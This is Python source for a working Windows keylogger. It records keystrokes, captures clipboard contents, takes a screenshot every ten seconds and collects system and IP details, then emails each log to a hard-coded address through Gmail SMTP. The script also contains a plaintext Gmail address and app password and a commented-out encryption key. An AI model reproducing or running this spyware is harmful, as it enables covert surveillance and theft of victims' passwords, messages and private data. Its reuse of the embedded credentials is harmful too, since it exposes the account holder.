from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from PIL import ImageGrab
from requests import get
# from cryptography.fernet import Fernet
import getpass

# Keylogger settings and email information
keys_information = "key_log.txt"
system_information = "system_information.txt" 
clipboard_information = "clipboard.txt"        
screenshot_information = "screenshot.png" 

email_address = "sameerthadimarri993@gmail.com"
password = "ihjykuywkzlhyqiv"

toaddr = "sidedara88@gmail.com"
username = getpass.getuser()

file_path = "C:\\Users\\Edara .Vignesh\\OneDrive\\Desktop\\Key Logger\\Key Logger"
extend = "\\"

# Set up encryption key
# key = "hph6CWQRH3Ii6YXi_9M_KNs01vDJOGqhtNX5SxtydiM=" 

# Function to send email  
def send_email(filename, attachment, toaddr): 
    fromaddr = email_address
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Log File"
    body = "Body_of_the_mail"
    msg.attach(MIMEText(body, 'plain'))

    with open(attachment, 'rb') as attachment_file:
        p = MIMEBase('application', 'octet-stream')
        p.set_payload(attachment_file.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', f"attachment; filename= {filename}")
    msg.attach(p)

    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, password)
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

# Function to capture clipboard contents
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data: \n" + pasted_data)
        except:
            f.write("Clipboard could not be copied")

# Function to take a screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

# Function to get the system information
def computer_information():
    with open(file_path + extend + system_information, "a") as f:
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try:
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip + "\n")
        except Exception:
            f.write("Couldn't get Public IP Address (most likely max query)\n")
        f.write("Processor: " + (platform.processor()) + '\n')
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname: " + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

# Function to listen to key presses
def on_press(key):
    with open(file_path + extend + keys_information, "a") as f:
        k = str(key).replace("'", "")
        if k.find("space") > 0:
            f.write('\n')
        elif k.find("Key") == -1:
            f.write(k)

def write_file(keys):
    with open(file_path + extend + keys_information, "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            print(k, end='')  # Print the key logs to the command prompt
            if k.find("space") > 0:
                f.write(' ')
                print(' ')
            elif k.find("Key") == -1:
                f.write(k)
            f.flush()

# Function to listen to key presses and capture them
def on_press(key):
    global keys, current_time
    keys.append(key)
    write_file(keys)
    keys = []

# Function to perform the screenshot and key logging tasks
def keylog_and_screenshot():
    global keys, current_time
    keys = []
    current_time = time.time()
    screenshot_time = current_time + 10  # Set next screenshot time
    keylog_email_time = current_time + 60  # Set next key log email time

    with Listener(on_press=on_press) as listener:
        while True:
            time.sleep(0.1)  # Small delay to prevent high CPU usage
            current_time = time.time()

            # Taking a screenshot and sending it every 10 seconds sameer thadimarri helloworld sameer
            if current_time > screenshot_time:
                screenshot()
                send_email(screenshot_information, file_path + extend + screenshot_information, toaddr)
                screenshot_time = current_time + 10

            # Sending keylog information every 60 seconds
            if current_time > keylog_email_time:
                send_email(keys_information, file_path + extend + keys_information, toaddr)  
                keylog_email_time = current_time + 60

if __name__ == "__main__":
    # Send computer information once at the start
    computer_information()
    send_email(system_information, file_path + extend + system_information, toaddr)

    # Send clipboard information once at the start
    copy_clipboard()
    send_email(clipboard_information, file_path + extend + clipboard_information, toaddr)

    # Start the keylogger and screenshot loop
    keylog_and_screenshot()